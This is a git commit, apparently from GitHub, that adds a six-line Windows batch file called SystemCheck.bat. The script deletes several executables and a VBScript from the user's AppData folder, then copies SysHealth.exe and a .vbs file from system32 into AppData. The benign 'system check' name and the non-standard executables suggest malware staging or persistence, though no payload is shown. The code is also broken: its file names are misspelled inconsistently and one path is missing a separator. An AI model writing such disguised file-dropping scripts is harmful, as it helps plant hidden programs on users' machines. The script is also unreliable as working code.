8ff25cc5c3b4268dc762394f06332f26813d9fa4
blueskycloud137 <117394858+blueskycloud137@users.noreply.github.com>
2022-11-24 21:02:05 +0300

    Create SystemCheck.bat

---
+++ SystemCheck.bat
@@ -0,0 +1,6 @@
+del %appdata%/a.exe
+del %appdata%/SysHealth.exe
+del %appdata%/SystemCheckHealt.vbs
+
+copy %windir%/system32/SysHealth.exe %appdata%\
+copy %windir%system32/SystemChechHealth.vbs %appdata%\
